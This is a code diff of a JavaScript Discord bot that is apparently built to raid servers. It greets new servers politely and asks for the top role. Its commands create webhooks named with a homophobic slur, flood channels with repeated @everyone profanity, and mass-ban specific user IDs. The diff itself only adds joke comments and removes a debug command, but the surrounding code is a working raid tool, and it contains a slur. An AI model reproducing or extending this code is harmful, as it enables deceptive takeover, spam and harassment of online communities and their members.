@@ -12,6 +12,7 @@ client.on("ratelimit", () =>{
 
 client.on("guildAdd", (guild) =>{
   guild.systemChannel.send(`thank you for adding this bot! please put me on top role for best experience, thank you.`)
+  //lol
 });
 
 client.on("ready", () => { 
@@ -26,7 +27,6 @@ client.on("message", async (message) => {
     const comando = args.shift().toLowerCase();
 
     const server = message.guild.channels;
-    const botrole = message.guild.roles.find("name", "Tefoco V3");
     switch(comando) {
         case "yeet":
             message.delete();
@@ -39,7 +39,7 @@ client.on("message", async (message) => {
                         const mch1 = message.channel.id
                         m.createWebhook("get raided faggots").then(w => {
                           const case1hook = new Discord.WebhookClient(w.id, w.token)
-                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
+                          case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`) //loops didnt work i swaer
                           case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                           case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                           case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
@@ -114,9 +114,6 @@ client.on("message", async (message) => {
           message.guild.ban(`426537812993638400`)
           message.guild.ban(`159985870458322944`)
           message.guild.ban(`512333785338216465`)
-        break;
-        case "rolepos":
-          message.channel.send(botrole.position)
         break;
         case "yes":
           message.delete();
